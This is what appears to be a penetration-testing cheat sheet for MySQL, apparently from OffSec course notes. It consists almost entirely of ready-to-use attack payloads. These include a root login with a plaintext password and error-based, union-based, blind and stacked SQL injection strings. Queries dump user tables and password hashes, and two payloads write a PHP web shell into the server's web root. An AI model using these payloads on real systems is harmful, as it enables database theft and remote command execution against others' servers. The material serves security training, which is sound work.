# MySQL

```shell
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

{% code overflow="wrap" %}
```sql
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';

```
{% endcode %}

### _<mark style="background-color:purple;">**Error-Based SQLi**</mark>_

```sql
offsec' OR 1=1 --
```

{% code overflow="wrap" %}
```sql
' or 1=1 in (select @@version) -- //
-- MySQL accepts both version() and @@version statements.
```
{% endcode %}

```sql
' OR 1=1 in (SELECT * FROM users) -- //
```

{% code overflow="wrap" %}
```sql
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
{% endcode %}

#### _<mark style="background-color:purple;">**Union-Based SQLi**</mark>_

```sql
user' OR 1=1; -- //
```

```sql
' ORDER BY 6; -- //
-- change number until error occurs
-- when error occurs that means there is n-1 columns
```

```sql
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
-- determine which columns are displayed
```

{% code overflow="wrap" %}
```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
-- dumps the current database name, the user, and the MySQL version in the first, second, and third columns
```
{% endcode %}

```sql
' UNION SELECT null,user(),null,null,null; -- //
-- returns the current MySQL user
```

{% code overflow="wrap" %}
```sql
' UNION SELECT null, DATABASE(), null, null, null; -- //
-- returns the database name
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' UNION SELECT null,null,null,null,group_concat(table_name),null FROM information_schema.tables WHERE table_schema = DATABASE(); -- //
-- get table name when only 5th column is rendered
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
-- returns table and column names
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' UNION SELECT null,null,null,null,group_concat(column_name),null FROM information_schema.columns WHERE table_name = 'subscribers'; -- //
-- get all column names from subscribers table
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' UNION SELECT null,null,null,null,group_concat(id, '|', emails, '|', is_donor, '|', donor_type, '|', status, '|', created_at),null FROM subscribers; -- //
-- dump table
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```
{% endcode %}

#### Upload a web shell to a writeable directory:

{% code overflow="wrap" %}
```sql
' UNION SELECT "", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
{% endcode %}

{% code overflow="wrap" %}
```sql
' UNION ALL SELECT "<?php system($_GET['cmd']);?>",NULL,NULL,NULL,NULL,NULL INTO OUTFILE "/var/www/html/webshell.php"#
```
{% endcode %}

### _<mark style="background-color:purple;">Blind SQLi</mark>_

```sql
' AND 1=1 -- //
```

```sql
' AND IF (1=1, sleep(3),'false') -- //
```

### _<mark style="background-color:purple;">Stacked queries SQLi</mark>_

**command injeciton**

{% code overflow="wrap" %}
```sql
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```
{% endcode %}
